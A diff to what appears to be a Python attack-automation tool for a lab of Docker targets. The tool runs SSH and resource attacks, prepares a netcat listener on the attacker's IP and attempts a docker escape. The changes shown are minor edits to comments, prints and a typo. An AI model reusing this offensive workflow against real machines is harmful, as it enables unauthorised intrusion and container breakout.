@@ -117,10 +117,11 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
             """if(attack_name=="tomcat_server" and C.TARGETS_DOCKERS[target_ip][0]["docker_name"]!="tomcat_server"):
                 print(f"{C.COL_YELLOW}[*] Special attack tomcat_server cannot be done on this machine, skipping... {C.COL_RESET}")
                 continue
+                """
             if(attack_name=="smtp_server" and C.TARGETS_DOCKERS[target_ip][0]["docker_name"]!="smtp_server"):
                 print(f"{C.COL_RED}[-] Special attack smtp_server cannot be done on this machine, skipping... {C.COL_RESET}")
                 continue
-            """
+            
             if(attack_type=="ResourceAttack"):
                 attack_obj=ResourceAttack(attack_name,attack_instr,attack_wait, mc)
             elif(attack_type=="SshAttack"):
@@ -159,7 +160,6 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                         
                         mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
-                        print("Tryng docker escape")
                         escape=mc.docker_escape(atk_sess)
                         if(escape):
                             #print(escape)
@@ -171,7 +171,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                     else:
                         break 
                 else:
-                    print(f"{C.COL_YELLOW}[*] false positive occured, ignoring... {C.COL_RESET}")
+                    print(f"{C.COL_YELLOW}[*] false positive occurred, ignoring... {C.COL_RESET}")
                     
             else:
                 uncompromised_machines.add(target_ip)
